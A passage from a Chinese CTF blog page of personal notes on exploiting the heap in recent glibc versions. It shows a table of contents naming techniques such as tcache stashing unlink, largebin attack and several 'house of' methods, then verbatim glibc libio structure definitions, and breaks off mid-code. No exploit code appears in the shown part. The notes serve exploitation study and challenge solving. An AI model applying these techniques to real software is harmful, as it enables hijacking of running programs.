<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="该笔记目的是为了方便自己做题，所以每个打法写的非常简便，且部分内容为从各位师傅的文章中直接复制，没有记录更加深入的原理 部分结构源码_IO_FILE123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657struct _IO_FILE&#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="高版本glibc堆利用笔记">
<meta property="og:url" content="https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="该笔记目的是为了方便自己做题，所以每个打法写的非常简便，且部分内容为从各位师傅的文章中直接复制，没有记录更加深入的原理 部分结构源码_IO_FILE123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657struct _IO_FILE&#123;">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-11-12T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-22T07:16:33.804Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>高版本glibc堆利用笔记</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&text=高版本glibc堆利用笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&is_video=false&description=高版本glibc堆利用笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=高版本glibc堆利用笔记&body=Check out this article: https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&name=高版本glibc堆利用笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&t=高版本glibc堆利用笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%BB%93%E6%9E%84%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">部分结构源码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE"><span class="toc-number">1.1.</span> <span class="toc-text">_IO_FILE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-jump-t"><span class="toc-number">1.2.</span> <span class="toc-text">_IO_jump_t</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#struct-IO-wide-data"><span class="toc-number">1.3.</span> <span class="toc-text">struct _IO_wide_data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-wfile-jumps"><span class="toc-number">1.4.</span> <span class="toc-text">_IO_wfile_jumps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-printf-buffer-as-file-jumps"><span class="toc-number">1.5.</span> <span class="toc-text">_IO_printf_buffer_as_file_jumps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-cookie-jumps"><span class="toc-number">1.6.</span> <span class="toc-text">_IO_cookie_jumps</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tcache-Stashing-Unlink-Attack"><span class="toc-number">2.</span> <span class="toc-text">Tcache Stashing Unlink Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-how2heap"><span class="toc-number">2.1.</span> <span class="toc-text">poc(how2heap):</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache"><span class="toc-number">3.</span> <span class="toc-text">fastbin reverse into tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-how2heap-1"><span class="toc-number">3.1.</span> <span class="toc-text">poc(how2heap):</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin-attack"><span class="toc-number">4.</span> <span class="toc-text">largebin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">5.</span> <span class="toc-text">利用_IO_2_1_stdout_泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87off-by-null%E8%BF%9B%E8%A1%8Cunlink"><span class="toc-number">6.</span> <span class="toc-text">通过off_by_null进行unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">7.</span> <span class="toc-text">house of botcake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">8.</span> <span class="toc-text">house of kiwi(&lt;&#x3D; 2.36)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-cat"><span class="toc-number">9.</span> <span class="toc-text">house of cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-%E7%A7%A6%E6%9C%88%E6%B1%89%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">house of 秦月汉关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">10.1.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">11.</span> <span class="toc-text">house of apple2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-husk"><span class="toc-number">12.</span> <span class="toc-text">house of husk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-pig"><span class="toc-number">13.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-emma"><span class="toc-number">14.</span> <span class="toc-text">house of emma</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tls-dtor-list%EF%BC%8C%E5%88%A9%E7%94%A8-call-tls-dtors%E6%8B%BF%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-number">15.</span> <span class="toc-text">劫持tls_dtor_list，利用__call_tls_dtors拿到权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-apple3-house-of-%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83"><span class="toc-number">16.</span> <span class="toc-text">house of apple3 + house of 一骑当千</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some"><span class="toc-number">17.</span> <span class="toc-text">house of some</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-banana"><span class="toc-number">18.</span> <span class="toc-text">house of banana</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87puts%E5%87%BD%E6%95%B0%E6%9D%A5%E8%A7%A6%E5%8F%91IO%E9%93%BE"><span class="toc-number">19.</span> <span class="toc-text">通过puts函数来触发IO链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some%E6%94%B9%E8%BF%9B%E7%89%88"><span class="toc-number">20.</span> <span class="toc-text">house of some改进版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some2"><span class="toc-number">21.</span> <span class="toc-text">house of some2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">21.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        高版本glibc堆利用笔记
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-11-12T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-11-13</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>该笔记目的是为了方便自己做题，所以每个打法写的非常简便，且部分内容为从各位师傅的文章中直接复制，没有记录更加深入的原理</p>
<h3 id="部分结构源码"><a href="#部分结构源码" class="headerlink" title="部分结构源码"></a>部分结构源码</h3><h4 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE  <span class="comment">// 可以看出如果使用旧的 _IO_FILE ,那我们经常说的IO就是  _IO_FILE_complete</span></span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="struct-IO-wide-data"><a href="#struct-IO-wide-data" class="headerlink" title="struct _IO_wide_data"></a>struct _IO_wide_data</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<h4 id="IO-printf-buffer-as-file-jumps"><a href="#IO-printf-buffer-as-file-jumps" class="headerlink" title="_IO_printf_buffer_as_file_jumps"></a>_IO_printf_buffer_as_file_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span 